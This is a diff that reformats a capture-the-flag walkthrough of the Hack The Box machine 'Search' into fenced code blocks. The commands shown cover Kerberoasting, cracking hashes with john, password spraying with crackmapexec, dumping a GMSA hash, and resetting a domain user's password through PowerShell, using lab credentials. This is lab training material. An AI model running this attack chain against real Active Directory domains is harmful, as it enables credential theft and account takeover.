@@ -153,7 +153,10 @@ We start with [`BloodHound.py`](/assets/Search/https://github.com/fox-it/BloodHo
 
 **Note:** it's recommended to set your **DNS** server in `/etc/resolv.conf` to the box's IP to make sure things go smoothly when using any of the tools we're about to use.
 
-**Command:** `python3 bloodhound.py -d search.htb -dc research.search.htb -u hope.sharp -p 'IsolationIsKey?'`
+**Command:** 
+```bash
+python3 bloodhound.py -d search.htb -dc research.search.htb -u hope.sharp -p 'IsolationIsKey?'
+```
 
 ![bloodhound-py](/assets/Search/bloodhound-py.jpg)
 
@@ -170,13 +173,19 @@ We would first have to make our way to any of users on the left within the `ITSE
 ### Kerberoasting `web_svc`
 we use impacket's `GetUserSPNs.py`
 
-**Command:** `python3 GetUserSPNs.py -debug -request -dc-ip 10.10.11.129 search.htb/hope.sharp:'IsolationIsKey?'`
+**Command:**
+```bash
+python3 GetUserSPNs.py -debug -request -dc-ip 10.10.11.129 search.htb/hope.sharp:'IsolationIsKey?'
+```
 
 ![kerberoasted](/assets/Search/kerberoasted.jpg)
 
 And we crack the password using `john`
 
-**Command:** `john web_svc_hash -w=/usr/share/wordlists/rockyou.txt`
+**Command:**
+```bash
+john web_svc_hash -w=/usr/share/wordlists/rockyou.txt
+```
 
 ![cracked-with-john](/assets/Search/cracked-with-john.jpg)
 
@@ -187,7 +196,10 @@ It has turned into a habit for me to spray any password I get on all possible us
 
 *In order to get a the full list of domain users,* I use `crackmapexec` with the `--users` flag.
 
-**Command:** `crackmapexec smb 10.10.11.129 -u 'web_svc' -p '@3ONEmillionbaby' --users`
+**Command:**
+```bash
+crackmapexec smb 10.10.11.129 -u 'web_svc' -p '@3ONEmillionbaby' --users
+````
 
 ![cme-full-userlist](/assets/Search/cme-full-userlist.jpg)
 
@@ -198,7 +210,10 @@ We find out that another user had been user the same password **"@3ONEmillionbab
 ### Enumerating SMB access for Edgar
 We use `crackmapexec`'s `spider_plus` module to get a *nicely-formatted* **JSON** output for `edgar`'s share access.
 
-**Command:** `crackmapexec smb 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -M spider_plus`
+**Command:** 
+```bash
+crackmapexec smb 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -M spider_plus
+```
 
 We notice something interesting in the results:
 
@@ -234,7 +249,10 @@ and since `sierra` is a member of the `ITSEC` group, we're going to go for a ful
 ### Reading the GMSA password & Resetting `tristan`'s password
 We can obtain the **NTLM** hash of the **GMSA** `BIR-ADFS-GMSA$` with a **python** tool called [`gMSADumper`](/assets/Search/https://github.com/micahvandeusen/gMSADumper)
 
-**Command:** `python3 gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb`
+**Command:** 
+```bash
+python3 gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb
+```
 
 ![got-gmsa-ntlm](/assets/Search/got-gmsa-ntlm.jpg)
 
@@ -270,24 +288,24 @@ we get a nice web terminal after authenticating:
 *In order to be able to run code as* `BIR-ADFS-GMSA`, we're going to do a couple of things:
 
 1. Obtain the **GMSA** password as a secure string. This can be done with the below command:
-```
+```powershell
 $secstringpassword = (ConvertFrom-ADManagedPasswordBlob (get-adserviceaccount -filter * -Properties msDS-ManagedPassword).'msDS-ManagedPassword').SecureCurrentPassword
 ```
 2. Create a `PSCredential` object with both the **GMSA** username and the secure string.
-```
+```powershell
 $cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $secstringpassword
 ```
 3. Execute a password reset command using the created `PSCredential`:
-```
-$Script = {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)}`
+```powershell
+$Script = {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)}
 Invoke-Command -ComputerName 127.0.0.1 -credential $cred -ScriptBlock $Script
 ```
 4. Create another `PSCredential` object but with `tristan`'s new password:
-```
-$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)`
+```powershell
+$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)
 ```
 5. Execute commands as `tristan` using the new credential object:
-```
+```powershell
 Invoke-Command -ComputerName 127.0.0.1 -credential $killercreds -ScriptBlock {whoami}
 ```
 
